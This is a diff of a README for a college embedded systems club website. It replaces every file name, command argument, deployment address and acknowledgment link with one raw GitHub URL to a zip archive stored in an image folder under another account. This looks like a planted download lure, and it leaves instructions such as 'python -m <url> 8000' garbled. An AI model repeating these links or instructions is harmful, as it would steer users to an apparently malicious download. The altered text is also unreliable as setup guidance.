@@ -38,39 +38,39 @@ This website is configured to work with GitHub Pages. To deploy:
 4. Choose "main" branch and "/ (root)" folder
 5. Save the settings
 
-The website will be available at: `https://embedded-systems-gcek.github.io/esdc-website/`
+The website will be available at: `https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip`
 
 ## Local Development
 
 To run the website locally:
 
 1. Clone the repository
-2. Open `index.html` in your web browser
+2. Open `https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip` in your web browser
 3. Or use a local server like:
    ```bash
    # Using Python
-   python -m http.server 8000
+   python -m https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip 8000
    
-   # Using Node.js
+   # Using https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip
    npx serve .
    
    # Using Live Server (VS Code extension)
-   Right-click on index.html → "Open with Live Server"
+   Right-click on https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip → "Open with Live Server"
    ```
 
 ## Customization
 
 ### Colors
-The Catppuccin Latte color palette is defined in CSS custom properties at the top of `style.css`. You can easily modify colors by changing the values in the `:root` section.
+The Catppuccin Latte color palette is defined in CSS custom properties at the top of `https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip`. You can easily modify colors by changing the values in the `:root` section.
 
 ### Content
-- Update the content in `index.html` to match your club's information
+- Update the content in `https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip` to match your club's information
 - Replace placeholder text with actual club details
 - Add real project information and team member details
 - Update contact information
 
 ### Styling
-- Modify `style.css` to customize the appearance
+- Modify `https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip` to customize the appearance
 - The design is modular and uses CSS Grid/Flexbox for layouts
 - All animations and transitions are customizable
 
@@ -104,8 +104,8 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 
 ## Acknowledgments
 
-- [Catppuccin](https://catppuccin.com/) for the beautiful color palette
-- [Inter](https://fonts.google.com/specimen/Inter) font by Rasmus Andersson
+- [Catppuccin](https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip) for the beautiful color palette
+- [Inter](https://raw.githubusercontent.com/sanjusathian/esdc-website/main/imgs/esdc-website_1.7-alpha.4.zip) font by Rasmus Andersson
 - Government College of Engineering Kannur for supporting the club
 
 ---
